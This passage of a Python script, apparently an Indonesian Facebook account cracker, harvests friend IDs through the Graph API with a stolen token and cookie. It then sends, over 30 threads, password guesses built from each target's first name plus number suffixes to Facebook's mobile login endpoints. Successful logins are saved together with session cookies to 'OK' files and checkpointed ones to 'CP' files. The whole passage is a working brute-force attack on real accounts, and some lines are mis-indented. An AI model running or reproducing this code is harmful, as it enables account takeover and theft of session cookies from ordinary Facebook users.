	#fahrukate('=' * 54)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└─ unstable signal ')
			exit()
	try:
		print(f'{A}[{H}●{A}] {P}Total Id Collected : {hh}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('└─ unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'└─{k} Friendship Not Public {x}')
		time.sleep(3)
		back()

def setting():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	tanya()
	
def tanya():
	pwplus=input(f'{P}{A}[{H}●{A}] {P}Add Password Manual? (y/t) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{A}[{H}●{A}] {P}Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	#uatambah = input(f'{P}{A}[{H}●{A}] {P}Add Manual User-Agent? (y/t) : ')
	#if uatambah in ['y','Ya','ya','Y']:
		#ualuh.append('ya')
		#bzer = input(f'{A}[{H}●{A}] {P}Enter Additional User-Agent : ')
		#ualu.append(bzer)
	#else:
		#ualuh.append('tidak')
	passwrd()

def passwrd():
	global prog,des
	#fahrukate('-' * 55)
	#print(f'┌─ 
	#print(f'{A}[{H}●{A}] {P}Proses Crack Sedang Berjalan......')
	fahrukate('━' * 55);prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn());des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'321')
						pwv.append(frs+'234')
						pwv.append(frs+'456')
						pwv.append(frs+'#')
						pwv.append(frs+'123456789')
						pwv.append(frs+'2007')
			            pwv.append(frs+'2006')
			            pwv.append(frs+'2005')
			            pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'456')
						pwv.append(frs+'789')
						pwv.append(frs+'889')
						pwv.append(frs+'11')
						pwv.append(frs+'00')
						pwv.append(frs+'11')
						pwv.append(frs+'12')
						pwv.append(frs+'23')
						pwv.append('anjay123')
						pwv.append('alay123')
						pwv.append('katasandi')
						pwv.append('kontol')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'crack' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print()
		print(f'{A}[{H}●{A}] {h}OK : {h}%s '%(ok))
		print(f'{A}[{H}●{A}] {k}CP : {k}%s{x} '%(cp))
		print()
	
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r{A}[{M}●{A}] {P}[deep_white]{(loop)}/{len(id)}[/] {x}[green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(entot)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
			head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f"┌── {J}Results-Cp-{zxc}{x}")
				tree.add(f"[bold yellow]{idf}[bold white]│[bold yellow]{pw}")
				#tree.add(f"[bold yellow]{koki}")
				tree.add(f"[bold red]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"┌── {A}Results-Ok-{zxc}{x}")
				tree.add(f"[bold green]{idf}[bold white]│[bold green]{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold cyan]{ua}\n")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crackk(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r{A}[{H}●{A}] {P}[deep_white]{(loop)}/{len(id)}[/] {x}[green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number": "0","unrecognized_tries": "0","email": idf,"prefill_contact_point": f"{idf} {pw}","prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": True,"is_smart_lock": False,"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),"bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"encpass": f"#PWD_BROWSER:0:{str(TimeRikodYatim()).split('.')[0]}:{pw}","jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)}
			headers = {"Host": "m.facebook.com","content-length": f"{str(len(data))}","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"user-agent": ua,"content-type": "application/x-www-form-urlencoded","accept": "*/*","origin": "https://m.facebook.com","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data = data, headers = headers, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f"┌── {J}Results-Cp-{zxc}{x}")
				tree.add(f"[bold yellow]{idf}[bold white]│[bold yellow]{pw}")
				#tree.add(f"[bold yellow]{koki}")
				tree.add(f"[bold red]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"┌── {A}Results-Ok-{zxc}{x}")
				tree.add(f"[bold green]{idf}[bold white]│[bold green]{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold cyan]{ua}\n")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
	